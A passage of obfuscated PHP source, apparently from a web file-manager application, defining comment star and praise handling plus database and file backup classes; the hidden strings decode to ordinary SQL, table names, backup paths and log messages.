$_SERVER[ˆ¡¹µ‹Â]; if ($¾şÛ¨ˆï[$ÓëÕ‰[1991]]) { $„Ğò÷¡ë = $this->where(array($ÓëÕ‰[1992] => $¾şÛ¨ˆï[$ÓëÕ‰[1991]]))->find(); if (!$„Ğò÷¡ë || $„Ğò÷¡ë[$ÓëÕ‰[190]] != $¾şÛ¨ˆï[$ÓëÕ‰[190]] || $„Ğò÷¡ë[$ÓëÕ‰[569]] != $¾şÛ¨ˆï[$ÓëÕ‰[569]]) { return !1; } $this->where(array($ÓëÕ‰[1992] => $¾şÛ¨ˆï[$ÓëÕ‰[1991]]))->setAdd($ÓëÕ‰[1993], 1); } $¾şÛ¨ˆï[$ÓëÕ‰[1994]] = 0; $¾şÛ¨ˆï[$ÓëÕ‰[1993]] = 0; $¾şÛ¨ˆï[$ÓëÕ‰[817]] = 1; return $this->add($¾şÛ¨ˆï); } public function commentCount($ì’í·±¦, $äµü‚Ö, $ËÎÏÖç  = false) { $Ñôñ¸ªŠ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ì’í·±¦) { return array(); } if (is_string($ì’í·±¦) || is_int($ì’í·±¦)) { $ì’í·±¦ = array($ì’í·±¦); } $¹±ŞÓÛ = array($Ñôñ¸ªŠ[569], $Ñôñ¸ªŠ[1995] => $Ñôñ¸ªŠ[565]); $³™·‡İ = array($Ñôñ¸ªŠ[569] => array($Ñôñ¸ªŠ[7], $ì’í·±¦), $Ñôñ¸ªŠ[190] => $äµü‚Ö); if ($ËÎÏÖç ) { $³™·‡İ[$Ñôñ¸ªŠ[1763]] = $ËÎÏÖç ; } $ ¥—¥Ñ§ = $this->field($¹±ŞÓÛ)->where($³™·‡İ)->group($Ñôñ¸ªŠ[569])->select(); return array_to_keyvalue($ ¥—¥Ñ§, $Ñôñ¸ªŠ[569], $Ñôñ¸ªŠ[565]); } public function starTarget($îîÁÑ ç, $‡åğ¡ï) { $Œ¶Åæá =& $_SERVER[ˆ¡¹µ‹Â]; $ì•Ëğ”× = $îîÁÑ ç + self::TYPE_STAR_OFFSET; $‚ùíäÅ = array($Œ¶Åæá[1763] => USER_ID, $Œ¶Åæá[190] => $ì•Ëğ”×, $Œ¶Åæá[569] => $‡åğ¡ï); $ú‘îñ­ª = $this->where($‚ùíäÅ)->find(); if ($ú‘îñ­ª) { return $this->where(array($Œ¶Åæá[475] => $ú‘îñ­ª[$Œ¶Åæá[475]]))->delete(); } $¶©¢öÌ‘ = array($Œ¶Åæá[1991] => 0, $Œ¶Åæá[1763] => USER_ID, $Œ¶Åæá[817] => 1, $Œ¶Åæá[171] => $Œ¶Åæá[12], $Œ¶Åæá[190] => $ì•Ëğ”×, $Œ¶Åæá[569] => $‡åğ¡ï, $Œ¶Åæá[1994] => 0, $Œ¶Åæá[1993] => 0); return $this->add($¶©¢öÌ‘); } public function starTargetCount($“ôÊÅÑ, $Š¿æŠ±) { $‘ÈÄäÀ• =& $_SERVER[ˆ¡¹µ‹Â]; $ÙÆá¡«æ = $Š¿æŠ± + self::TYPE_STAR_OFFSET; $¾şşŠ£œ = $this->commentCount($“ôÊÅÑ, $ÙÆá¡«æ); $†™¡öÂÎ = $this->commentCount($“ôÊÅÑ, $ÙÆá¡«æ, USER_ID); return array($‘ÈÄäÀ•[1996] => $¾şşŠ£œ, $‘ÈÄäÀ•[1997] => $†™¡öÂÎ); } public function starTargetUserList($è¾¥øı®, $üŠøã÷†) { $­‘ÔÒÓÅ =& $_SERVER[ˆ¡¹µ‹Â]; $àÛùñ¡Ö = $è¾¥øı® + self::TYPE_STAR_OFFSET; $ÇÚ·œ¯ı = array($­‘ÔÒÓÅ[569] => $üŠøã÷†, $­‘ÔÒÓÅ[190] => $àÛùñ¡Ö); $¸›ê†‰§ = $this->where($ÇÚ·œ¯ı)->count(); $éùæ˜îğ = array($­‘ÔÒÓÅ[332] => $¸›ê†‰§, $­‘ÔÒÓÅ[1998] => array()); if (!$¸›ê†‰§) { return $éùæ˜îğ; } $èä›­Ì¡ = $this->field($­‘ÔÒÓÅ[1763])->where($ÇÚ·œ¯ı)->limit(500)->select(); $èä›­Ì¡ = array_to_keyvalue($èä›­Ì¡, $­‘ÔÒÓÅ[12], $­‘ÔÒÓÅ[1763]); $éùæ˜îğ[$­‘ÔÒÓÅ[1998]] = Model($­‘ÔÒÓÅ[577])->userListInfo($èä›­Ì¡); return $éùæ˜îğ; } public function prasiseUserList($‹ñÁ©†—) { $ˆ¸–½¾ö =& $_SERVER[ˆ¡¹µ‹Â]; $¼¨è›¯Œ = array($ˆ¸–½¾ö[1999] => $‹ñÁ©†—); $ûà¤Ü™ = $this->where($¼¨è›¯Œ)->find(); $…ÉÆŸ›ó = _get($ûà¤Ü™, $ˆ¸–½¾ö[1994], 0); $„°ŞšÛ• = array($ˆ¸–½¾ö[332] => $…ÉÆŸ›ó, $ˆ¸–½¾ö[1998] => array()); if (!$…ÉÆŸ›ó) { return $„°ŞšÛ•; } $§’“ş½ü = Model($ˆ¸–½¾ö[2000])->field($ˆ¸–½¾ö[1763])->where($¼¨è›¯Œ)->limit(500)->select(); $§’“ş½ü = array_to_keyvalue($§’“ş½ü, $ˆ¸–½¾ö[12], $ˆ¸–½¾ö[1763]); $„°ŞšÛ•[$ˆ¸–½¾ö[1998]] = Model($ˆ¸–½¾ö[577])->userListInfo($§’“ş½ü); return $„°ŞšÛ•; } public function remove($æñÌã»Á) { $Ï×’²Ì„ =& $_SERVER[ˆ¡¹µ‹Â]; $İ¢îşÏŸ = array($Ï×’²Ì„[1992] => $æñÌã»Á); $‘Íéôô = $this->where($İ¢îşÏŸ)->find(); if ($‘Íéôô[$Ï×’²Ì„[1991]]) { $this->where(array($Ï×’²Ì„[1992] => $‘Íéôô[$Ï×’²Ì„[1991]]))->setAdd($Ï×’²Ì„[1993], -1); } return $this->where($İ¢îşÏŸ)->delete(); } public function edit($Ş´ŞØ€, $ïİã«Øê) { $ö£¿§Á =& $_SERVER[ˆ¡¹µ‹Â]; $­â£×ë = array($ö£¿§Á[1992] => $Ş´ŞØ€); return $this->where($­â£×ë)->save(array($ö£¿§Á[2001] => $ïİã«Øê)); } public function prasise($À€êÈÊş) { $ÆÜá Œ¿ =& $_SERVER[ˆ¡¹µ‹Â]; $Ú˜‡¦¸¸ = Model($ÆÜá Œ¿[2002]); $ŒÄøüŸ´ = array($ÆÜá Œ¿[1992] => $À€êÈÊş, $ÆÜá Œ¿[1754] => USER_ID); $ÃÏ–Ëµ½ = $Ú˜‡¦¸¸->where($ŒÄøüŸ´)->find(); if (!$ÃÏ–Ëµ½) { $Ú˜‡¦¸¸->add($ŒÄøüŸ´); $Ş¡ıÃÑ = $this->where(array($ÆÜá Œ¿[1992] => $À€êÈÊş))->setAdd($ÆÜá Œ¿[1994], 1); } else { $Ú˜‡¦¸¸->where($ŒÄøüŸ´)->delete(); $Ş¡ıÃÑ = $this->where(array($ÆÜá Œ¿[1992] => $À€êÈÊş))->setAdd($ÆÜá Œ¿[1994], -1); } return $Ş¡ıÃÑ; } public function targetInfo($Ô£Ëø³Î, $ğ¡‘†Ã) { $‚„ú¸é =& $_SERVER[ˆ¡¹µ‹Â]; $…×¦Æ¹ã = array($‚„ú¸é[648] => $Ô£Ëø³Î, $‚„ú¸é[649] => $ğ¡‘†Ã); $Õ€Á¢²Ê = $this->where($…×¦Æ¹ã)->count(); $Û•€ú‹ü = "\x52\x49\x47\110\x54\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\143\157\155\x6d\x65\x6e\164\x5f\160\162\141\151\163\x65\40\x73\164\x61\x72\40\157\156\40\143\x6f\x6d\155\145\x6e\164\x2e\x63\x6f\155\155\x65\156\x74\x49\x44\40\75\x20\x73\x74\141\162\56\x63\x6f\155\155\x65\156\x74\111\104"; $ËæËïİğ = $this->alias($‚„ú¸é[430])->where($…×¦Æ¹ã)->join($Û•€ú‹ü, $‚„ú¸é[2003])->count(); $ËŠ ‚µ = array($‚„ú¸é[2004] => $Õ€Á¢²Ê, $‚„ú¸é[2005] => $ËæËïİğ); return $ËŠ ‚µ; } public function listData($å·’“ˆş) { $ô´¶ß…œ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($å·’“ˆş[$ô´¶ß…œ[2006]])) { if ($å·’“ˆş[$ô´¶ß…œ[2006]]) { $å·’“ˆş[$ô´¶ß…œ[1999]] = array($ô´¶ß…œ[1085], intval($å·’“ˆş[$ô´¶ß…œ[2006]])); } unset($å·’“ˆş[$ô´¶ß…œ[2006]]); } if (isset($å·’“ˆş[$ô´¶ß…œ[2007]])) { if ($å·’“ˆş[$ô´¶ß…œ[2007]]) { $å·’“ˆş[$ô´¶ß…œ[1999]] = array($ô´¶ß…œ[1082], intval($å·’“ˆş[$ô´¶ß…œ[2007]])); } unset($å·’“ˆş[$ô´¶ß…œ[2007]]); } return $this->_listData($å·’“ˆş); } private function _listData($«éåÛœ) { $‘ú½¯Òõ =& $_SERVER[ˆ¡¹µ‹Â]; $ùìŸ—Œˆ = $this->where($«éåÛœ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ùìŸ—Œˆ[$‘ú½¯Òõ[445]]); $this->_listAppendUser($ùìŸ—Œˆ[$‘ú½¯Òõ[445]]); $this->_listAppendMeta($ùìŸ—Œˆ[$‘ú½¯Òõ[445]]); return $ùìŸ—Œˆ; } private function _makeOrder() { $Ò•¿óµ÷ =& $_SERVER[ˆ¡¹µ‹Â]; $ÏË¿ÚÈ” = array($Ò•¿óµ÷[1994], $Ò•¿óµ÷[1993], $Ò•¿óµ÷[231]); $ÎŠÄúÊƒ = Input::get($Ò•¿óµ÷[530], $Ò•¿óµ÷[7], $Ò•¿óµ÷[497], $ÏË¿ÚÈ”); $ë³¶Éäö = Input::get($Ò•¿óµ÷[531], $Ò•¿óµ÷[7], $Ò•¿óµ÷[1756], array($Ò•¿óµ÷[2008], $Ò•¿óµ÷[526])); $áú¹ñŸ = $ÎŠÄúÊƒ . $Ò•¿óµ÷[53] . $ë³¶Éäö; return $this->order($áú¹ñŸ); } private function _listAppendParent(&$ï«ÎŸŠû) { $©óæ¼×„ =& $_SERVER[ˆ¡¹µ‹Â]; $Ò­ÛÄÉµ = array_unique(array_to_keyvalue($ï«ÎŸŠû, $©óæ¼×„[12], $©óæ¼×„[1991])); $Ò­ÛÄÉµ = array_remove_value($Ò­ÛÄÉµ, $©óæ¼×„[228]); if (!$Ò­ÛÄÉµ) { return; } $’ÀËùñÀ = $this->where(array($©óæ¼×„[1992] => array($©óæ¼×„[7], $Ò­ÛÄÉµ)))->select(); $’ÀËùñÀ = array_to_keyvalue($’ÀËùñÀ, $©óæ¼×„[1999]); foreach ($ï«ÎŸŠû as &$ÙÈÒŒŒ÷) { if (isset($’ÀËùñÀ[$ÙÈÒŒŒ÷[$©óæ¼×„[1991]]])) { $ÙÈÒŒŒ÷[$©óæ¼×„[2009]] = $’ÀËùñÀ[$ÙÈÒŒŒ÷[$©óæ¼×„[1991]]]; } } unset($ÙÈÒŒŒ÷); } private function _listAppendUser(&$–Û…–ñ) { $ÆĞÂıŒ =& $_SERVER[ˆ¡¹µ‹Â]; $¬ŞµËë = array_unique(array_to_keyvalue($–Û…–ñ, $ÆĞÂıŒ[12], $ÆĞÂıŒ[1763])); $¬ŞµËë = array_remove_value($¬ŞµËë, $ÆĞÂıŒ[228]); if (count($¬ŞµËë) == 0) { return; } foreach ($–Û…–ñ as $Å‰úš…Ú) { if (isset($Å‰úš…Ú[$ÆĞÂıŒ[2009]])) { $¬ŞµËë[] = $Å‰úš…Ú[$ÆĞÂıŒ[2009]][$ÆĞÂıŒ[1763]]; } } $àáé¯¸ã = Model($ÆĞÂıŒ[598])->userListInfo($¬ŞµËë); foreach ($–Û…–ñ as &$Å‰úš…Ú) { $Å‰úš…Ú[$ÆĞÂıŒ[662]] = $àáé¯¸ã[$Å‰úš…Ú[$ÆĞÂıŒ[1763]]]; if (isset($Å‰úš…Ú[$ÆĞÂıŒ[2009]])) { $Å‰úš…Ú[$ÆĞÂıŒ[2009]][$ÆĞÂıŒ[662]] = $àáé¯¸ã[$Å‰úš…Ú[$ÆĞÂıŒ[2009]][$ÆĞÂıŒ[1763]]]; } } unset($Å‰úš…Ú); } private function _listAppendMeta(&$õÍæò²‡) { $×ÒÁ”ßÍ =& $_SERVER[ˆ¡¹µ‹Â]; $Úñ‹À¬® = array_unique(array_to_keyvalue($õÍæò²‡, $×ÒÁ”ßÍ[12], $×ÒÁ”ßÍ[1999])); $Úñ‹À¬® = array_remove_value($Úñ‹À¬®, $×ÒÁ”ßÍ[228]); if (!$Úñ‹À¬®) { return; } foreach ($õÍæò²‡ as $ß®ØÂ±¦) { if (isset($ß®ØÂ±¦[$×ÒÁ”ßÍ[2009]])) { $Úñ‹À¬®[] = $ß®ØÂ±¦[$×ÒÁ”ßÍ[2009]][$×ÒÁ”ßÍ[1999]]; } } $šÍ¤É‚© = $this->metaList($Úñ‹À¬®); if (!$šÍ¤É‚©) { return !1; } foreach ($õÍæò²‡ as &$ß®ØÂ±¦) { $ß®ØÂ±¦[$×ÒÁ”ßÍ[539]] = $šÍ¤É‚©[$ß®ØÂ±¦[$×ÒÁ”ßÍ[1999]]]; if (isset($ß®ØÂ±¦[$×ÒÁ”ßÍ[2009]])) { $ß®ØÂ±¦[$×ÒÁ”ßÍ[2009]][$×ÒÁ”ßÍ[539]] = $šÍ¤É‚©[$ß®ØÂ±¦[$×ÒÁ”ßÍ[2009]][$×ÒÁ”ßÍ[1999]]]; } } unset($ß®ØÂ±¦); } private function metaList($ñÂ¬ÔâÏ) { $å¡±››Ç =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ñÂ¬ÔâÏ) { return array(); } $‹€«âûó = array($å¡±››Ç[1999] => array($å¡±››Ç[7], $ñÂ¬ÔâÏ)); $©ï‡Áòø = Model($å¡±››Ç[2010])->where($‹€«âûó)->select(); $©ï‡Áòø = array_to_keyvalue_group($©ï‡Áòø, $å¡±››Ç[1999]); foreach ($©ï‡Áòø as $¼¯›Äİ± => $ªØãüß¾) { $ğ§ÏÍÜ“ = array(); foreach ($ªØãüß¾ as $ıéÏ×£) { $ğ§ÏÍÜ“[$ıéÏ×£[$å¡±››Ç[97]]] = $ıéÏ×£[$å¡±››Ç[450]]; } $©ï‡Áòø[$¼¯›Äİ±] = $ğ§ÏÍÜ“; } return $©ï‡Áòø ? $©ï‡Áòø : array(); } public function removeTarget($úÉˆ¿Ú, $÷¨Ù¤½º) { $ã¬±ÚÆû =& $_SERVER[ˆ¡¹µ‹Â]; if (!$÷¨Ù¤½º) { return !0; } $÷¨Ù¤½º = is_array($÷¨Ù¤½º) ? $÷¨Ù¤½º : array($÷¨Ù¤½º); $¾ÁÌÁïï = array($ã¬±ÚÆû[190] => $úÉˆ¿Ú, $ã¬±ÚÆû[569] => array($ã¬±ÚÆû[7], $÷¨Ù¤½º)); $¤Ïƒ“Ã­ = $this->field($ã¬±ÚÆû[1999])->where($¾ÁÌÁïï)->select(); $”íë¨—Á = array_to_keyvalue($¤Ïƒ“Ã­, $ã¬±ÚÆû[12], $ã¬±ÚÆû[1999]); if (!$”íë¨—Á) { return !0; } $¾ÁÌÁïï = array($ã¬±ÚÆû[1999] => array($ã¬±ÚÆû[7], $”íë¨—Á)); $this->where($¾ÁÌÁïï)->delete(); Model($ã¬±ÚÆû[2002])->where($¾ÁÌÁïï)->delete(); Model($ã¬±ÚÆû[2011])->where($¾ÁÌÁïï)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\x65\137\143\x6f\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\x73\145\x72\x74", "\x66\165\156\143\164\151\x6f\x6e")); } goto B÷®É¢Ó®ö; CãŒŞÀ®²Õ: define($_SERVER[ˆ¡¹µ‹Â][317], 3); define($_SERVER[ˆ¡¹µ‹Â][318], 1); define($_SERVER[ˆ¡¹µ‹Â][319], 0); goto Dë Èù·÷Ã; CĞÑİâíÄÛ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ñßü˜Æ— =& $_SERVER[ˆ¡¹µ‹Â]; $éĞÊÓ…× = Backup::get(); self::$io = $éĞÊÓ…×[$ñßü˜Æ—[819]]; self::$name = $éĞÊÓ…×[$ñßü˜Æ—[32]]; $ğÂÓì« = new DbManage(); $ŠŸì¼ = $ğÂÓì«->dbType(); $†—±Ğï¡ = array($ñßü˜Æ—[852] => $ŠŸì¼, $ñßü˜Æ—[853] => time()); Backup::set($†—±Ğï¡); $Ëİ‹†ı· = $this->tmpFilesPath() . $ñßü˜Æ—[854] . self::$name . $ñßü˜Æ—[8]; del_dir($Ëİ‹†ı·); mk_dir($Ëİ‹†ı·); $ÃšİÕææ = $—İ€ÜŸ = 0; try { $¡£»«Ì = $ğÂÓì«->db()->getTables(); } catch (Exception $úÑ‘¹) { return !1; } $¡£»«Ì = array_diff($¡£»«Ì, array($ñßü˜Æ—[855], $ñßü˜Æ—[856])); foreach ($¡£»«Ì as $ëÏÏ‰Í¸) { $ÃšİÕææ += $ğÂÓì«->model($ëÏÏ‰Í¸)->count(); } $“öˆ“ä = new Task($ñßü˜Æ—[857], $ñßü˜Æ—[858], $ÃšİÕææ, LNG($ñßü˜Æ—[859]) . $ñßü˜Æ—[860] . LNG($ñßü˜Æ—[861])); $GLOBALS[$ñßü˜Æ—[862]] = self::$name; foreach ($¡£»«Ì as $ëÏÏ‰Í¸) { $Ì¸Ó±ßÂ = $Ëİ‹†ı· . $ëÏÏ‰Í¸ . $ñßü˜Æ—[863]; $ÖôüúÇ = null; if ($ëÏÏ‰Í¸ == $ñßü˜Æ—[864] && (!isset($éĞÊÓ…×[$ñßü˜Æ—[171]]) || $éĞÊÓ…×[$ñßü˜Æ—[171]] == $ñßü˜Æ—[228])) { $ÖôüúÇ = self::$io; } $—İ€ÜŸ += $ğÂÓì«->sqlFromDb($ëÏÏ‰Í¸, $Ì¸Ó±ßÂ, $“öˆ“ä, $ÖôüúÇ); } unset($GLOBALS[$ñßü˜Æ—[862]]); $“öˆ“ä->end(); if ($—İ€ÜŸ > $ÃšİÕææ) { $ÃšİÕææ = $—İ€ÜŸ; } $†—±Ğï¡ = array($ñßü˜Æ—[852] => $ŠŸì¼, $ñßü˜Æ—[840] => 1, $ñßü˜Æ—[865] => $ÃšİÕææ, $ñßü˜Æ—[866] => $—İ€ÜŸ, $ñßü˜Æ—[867] => time()); Backup::set($†—±Ğï¡); if ($ÃšİÕææ - $—İ€ÜŸ > 0) { $Ñú‹Ãè‚ = $ñßü˜Æ—[868]; if (!stristr(I18n::getType(), $ñßü˜Æ—[869])) { $Ñú‹Ãè‚ = $ñßü˜Æ—[870]; } write_log(array($Ñú‹Ãè‚, $†—±Ğï¡), $ñßü˜Æ—[858]); return !1; } return !0; } private function tmpFilesPath() { $ó³‰¶Å¨ =& $_SERVER[ˆ¡¹µ‹Â]; $îŒ¼³‰ = TEMP_FILES; if ($GLOBALS[$ó³‰¶Å¨[6]][$ó³‰¶Å¨[92]][$ó³‰¶Å¨[871]]) { $îŒ¼³‰ = $GLOBALS[$ó³‰¶Å¨[6]][$ó³‰¶Å¨[92]][$ó³‰¶Å¨[871]]; if (!mk_dir($îŒ¼³‰) || !is_writable($îŒ¼³‰) || !IO::mkfile($îŒ¼³‰ . $ó³‰¶Å¨[872])) { $îŒ¼³‰ = TEMP_FILES; } } return $îŒ¼³‰; } } class BackupDbFile { public function __construct() { } public function index() { $Åöƒ”Ş³ =& $_SERVER[ˆ¡¹µ‹Â]; $‘†ö¼ßÉ = Backup::get(); $îÑî­õ¿ = $‘†ö¼ßÉ[$Åöƒ”Ş³[32]]; $©¨ìÆ = $this->tmpFilesPath() . "\x62\x61\143\153\165\160\137{$îÑî­õ¿}\57"; $ÖĞ‡»€® = $this->backupPath($‘†ö¼ßÉ); if (!($ÖĞ‡»€® = IO::mkdir($ÖĞ‡»€®))) { return !1; } $¿ÌŞÙ— = IO::listPath($©¨ìÆ); $ñ‚ŞêÚ = isset($¿ÌŞÙ—[$Åöƒ”Ş³[86]]) ? $¿ÌŞÙ—[$Åöƒ”Ş³[86]] : array(); $âØ ˜ = array_sum(array_column($ñ‚ŞêÚ, $Åöƒ”Ş³[79])); if (!$âØ ˜) { return !1; } $Òñ«ü»Ù = array($Åöƒ”Ş³[873] => $âØ ˜, $Åöƒ”Ş³[874] => time()); Backup::set($Òñ«ü»Ù); $’ŞûÆÍÖ = new TaskFileTransfer($Åöƒ”Ş³[875], $Åöƒ”Ş³[858], count($ñ‚ŞêÚ), LNG($Åöƒ”Ş³[859]) . $Åöƒ”Ş³[462] . LNG($Åöƒ”Ş³[861]) . $Åöƒ”Ş³[876]); $’ŞûÆÍÖ->task[$Åöƒ”Ş³[830]] = $âØ ˜; foreach ($¿ÌŞÙ—[$Åöƒ”Ş³[86]] as $ñ©æŸ••) { $Èè¥Ç”È = IO::move($ñ©æŸ••[$Åöƒ”Ş³[87]], $ÖĞ‡»€®); if (!$Èè¥Ç”È) { $’ŞûÆÍÖ->end(); $œâ€œ¾ = IO::getLastError($Åöƒ”Ş³[877] . $ñ©æŸ••[$Åöƒ”Ş³[87]] . $Åöƒ”Ş³[878] . $ÖĞ‡»€® . $Åöƒ”Ş³[178]); write_log($œâ€œ¾, $Åöƒ”Ş³[858]); return !1; } } $å•±Ÿşœ = new DbManage(); $òÔ®‘¨ = $å•±Ÿşœ->getSqlFile(); if (!$òÔ®‘¨[$Åöƒ”Ş³[879]] || !$òÔ®‘¨[$Åöƒ”Ş³[13]]) { return !1; } IO::move($òÔ®‘¨[$Åöƒ”Ş³[879]], $ÖĞ‡»€®); IO::move($òÔ®‘¨[$Åöƒ”Ş³[13]], $ÖĞ‡»€®); $’ŞûÆÍÖ->end(); $Òñ«ü»Ù = array($Åöƒ”Ş³[880] => $âØ ˜, $Åöƒ”Ş³[881] => time()); Backup::set($Òñ«ü»Ù); return !0; } private function backupPath($ŞÂ½ùÅ ) { $ãä»ó³€ =& $_SERVER[ˆ¡¹µ‹Â]; $ë»ó×ÚÑ = $ŞÂ½ùÅ [$ãä»ó³€[32]]; $œ¸™à— = Model($ãä»ó³€[837])->get($ãä»ó³€[838]); $†Ãòş²æ = substr(md5($ãä»ó³€[839] . $œ¸™à— . $ë»ó×ÚÑ), 0, 8); return "\x7b\x69\157\72{$ŞÂ½ùÅ [$ãä»ó³€[819]]}\x7d\57\x64\141\164\x61\142\x61\163\x65\x2f\142\x61\143\x6b\x75\160\x2f" . $ë»ó×ÚÑ . $ãä»ó³€[11] . $†Ãòş²æ; } private function tmpFilesPath() { $·½×ñŞ =& $_SERVER[ˆ¡¹µ‹Â]; $†µÊÌÔ = TEMP_FILES; if ($GLOBALS[$·½×ñŞ[6]][$·½×ñŞ[92]][$·½×ñŞ[871]]) { $†µÊÌÔ = $GLOBALS[$·½×ñŞ[6]][$·½×ñŞ[92]][$·½×ñŞ[871]]; if (!mk_dir($†µÊÌÔ) || !is_writable($†µÊÌÔ) || !IO::mkfile($†µÊÌÔ . $·½×ñŞ[872])) { $†µÊÌÔ = TEMP_FILES; } } return $†µÊÌÔ; } } class BackupFile { public function __construct() { } public function index() { $ƒÆÒöİ = Backup::get(); $Û´¼¶äç = $ƒÆÒöİ[$_SERVER[ˆ¡¹µ‹Â][369]][$_SERVER[ˆ¡¹µ‹Â][230]][$_SERVER[ˆ¡¹µ‹Â][541]]; $ó×êè = array($_SERVER[ˆ¡¹µ‹Â][542] => array($_SERVER[ˆ¡¹µ‹Â][882], $Û´¼¶äç), $_SERVER[ˆ¡¹µ‹Â][883] => array($_SERVER[ˆ¡¹µ‹Â][407], $ƒÆÒöİ[$_SERVER[ˆ¡¹µ‹Â][819]])); $ù™ü¾ = (int) Model($_SERVER[ˆ¡¹µ‹Â][864])->where($ó×êè)->count($_SERVER[ˆ¡¹µ‹Â][541]); $˜¨¨»¸ = (int) Model($_SERVER[ˆ¡¹µ‹Â][864])->where($ó×êè)->sum($_SERVER[ˆ¡¹µ‹Â][79]); $ŒËùÖú§ = new TaskFileTransfer($_SERVER[ˆ¡¹µ‹Â][884], $_SERVER[ˆ¡¹µ‹Â][858], $ù™ü¾, LNG($_SERVER[ˆ¡¹µ‹Â][859]) . $_SERVER[ˆ¡¹µ‹Â][860] . LNG($_SERVER[ˆ¡¹µ‹Â][885])); $ŒËùÖú§->task[$_SERVER[ˆ¡¹µ‹Â][830]] = $˜¨¨»¸; $¼Æ‹ñ†Ö = array($_SERVER[ˆ¡¹µ‹Â][886] => $ù™ü¾, $_SERVER[ˆ¡¹µ‹Â][887] => $˜¨¨»¸, $_SERVER[ˆ¡¹µ‹Â][888] => time()); Backup::set($¼Æ‹ñ†Ö); $³†¹Ïº± = !0; $’Òğé = $this->storeIds(); $§Ï†–Ô = 1; $§ÂøÂò« = 1000; $êš§‚Ã¼ = $çË·Äù = 0; $ÂÙÉÜ£É = array(); $ÓàÄËŞ˜ = $Êİ•çù¡ = 0; do { $ô·áÑ¶‚ = $_SERVER[ˆ¡¹µ‹Â][889]; $Ô¶ş´«» = Model($_SERVER[ˆ¡¹µ‹Â][864])->where($ó×êè)->field($ô·áÑ¶‚)->order($_SERVER[ˆ¡¹µ‹Â][890])->selectPage($§ÂøÂò«, $§Ï†–Ô); $–ıÎÛ­† = !empty($Ô¶ş´«»[$_SERVER[ˆ¡¹µ‹Â][445]]) ? $Ô¶ş´«»[$_SERVER[ˆ¡¹µ‹Â][445]] : array(); foreach ($–ıÎÛ­† as $ñœæ¡Øß) { if (!$this->_fileExist($ñœæ¡Øß, $ÂÙÉÜ£É, $’Òğé)) { write_log("\146\151\154\145\40\x6e\157\x74\x20\145\x78\151\163\164\x2e\x66\151\x6c\x65\111\104\72{$ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][541]]}\54\x20\160\x61\164\150\72{$ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][87]]}", $_SERVER[ˆ¡¹µ‹Â][891]); continue; } $¨Ù®Öş¹ = $ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][87]]; $Ñ–”Àèø = "\173\151\x6f\x3a{$ƒÆÒöİ[$_SERVER[ˆ¡¹µ‹Â][819]]}\x7d" . substr($¨Ù®Öş¹, strlen("\173\151\157\72{$ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][892]]}\175")); if (IO::exist($Ñ–”Àèø)) { $ŒËùÖú§->updateFileEnd($ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][32]], $ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][79]]); } else { $Ñ–”Àèø = get_path_father($Ñ–”Àèø); IO::mkdir($Ñ–”Àèø); if (!IO::copy($¨Ù®Öş¹, $Ñ–”Àèø, $_SERVER[ˆ¡¹µ‹Â][893])) { write_log($_SERVER[ˆ¡¹µ‹Â][894] . $¨Ù®Öş¹ . $_SERVER[ˆ¡¹µ‹Â][878] . $Ñ–”Àèø . $_SERVER[ˆ¡¹µ‹Â][178], $_SERVER[ˆ¡¹µ‹Â][858]); $³†¹Ïº± = !1; break; } } $Û´¼¶äç = $ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][541]]; $çË·Äù += 1; $êš§‚Ã¼ += $ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][79]]; $Êİ•çù¡ += 1; $ÓàÄËŞ˜ += $ñœæ¡Øß[$_SERVER[ˆ¡¹µ‹Â][79]]; if ($êš§‚Ã¼ >= 1024 * 1024 * 100) { $¼Æ‹ñ†Ö = array($_SERVER[ˆ¡¹µ‹Â][818] => $Û´¼¶äç, $_SERVER[ˆ¡¹µ‹Â][895] => $Êİ•çù¡, $_SERVER[ˆ¡¹µ‹Â][896] => $ÓàÄËŞ˜); Backup::set($¼Æ‹ñ†Ö); $êš§‚Ã¼ = $çË·Äù = 0; } } $ü”·£ö = count($–ıÎÛ­†); $§Ï†–Ô++; } while ($ü”·£ö == $§ÂøÂò«); $ŒËùÖú§->end(); $¼Æ‹ñ†Ö = array($_SERVER[ˆ¡¹µ‹Â][897] => 1, $_SERVER[ˆ¡¹µ‹Â][828] => time(), $_SERVER[ˆ¡¹µ‹Â][842] => 1, $_SERVER[ˆ¡¹µ‹Â][818] => $Û´¼¶äç, $_SERVER[ˆ¡¹µ‹Â][898] => time()); if ($çË·Äù) { $¼Æ‹ñ†Ö[$_SERVER[ˆ¡¹µ‹Â][895]] = $Êİ•çù¡; $¼Æ‹ñ†Ö[$_SERVER[ˆ¡¹µ‹Â][896]] = $ÓàÄËŞ˜; } Backup::set($¼Æ‹ñ†Ö); return !0; } private function _fileExist($òªßÏÂ‹, &$Ã³×˜, $ø‡ÊÈ·µ) { $ØêÂƒœˆ =& $_SERVER[ˆ¡¹µ‹Â]; $î›ÉÁó = $òªßÏÂ‹[$ØêÂƒœˆ[87]]; if (in_array($òªßÏÂ‹[$ØêÂƒœˆ[541]], $Ã³×˜)) { return !1; } if (!in_array($òªßÏÂ‹[$ØêÂƒœˆ[892]], $ø‡ÊÈ·µ)) { return !1; } if (IO::exist($î›ÉÁó)) { return !0; } $¡ĞÉ†´ğ = get_path_father($î›ÉÁó); if (IO::exist($¡ĞÉ†´ğ)) { $Ã³×˜[] = $òªßÏÂ‹[$ØêÂƒœˆ[541]]; return !1; } $æï›¶¨¡ = array($ØêÂƒœˆ[892] => $òªßÏÂ‹[$ØêÂƒœˆ[892]], $ØêÂƒœˆ[87] => array($ØêÂƒœˆ[459], "{$¡ĞÉ†´ğ}\45")); $İ´öÏ¯§ = 